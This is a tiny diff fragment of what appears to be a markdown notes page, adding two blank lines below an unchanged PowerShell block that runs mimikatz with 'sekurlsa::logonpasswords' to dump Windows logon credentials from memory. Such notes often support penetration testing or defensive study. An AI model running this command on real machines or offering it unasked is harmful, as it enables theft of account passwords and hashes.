@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:17.352672+00:00'
 ```powershell
 PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
 ```
+
+
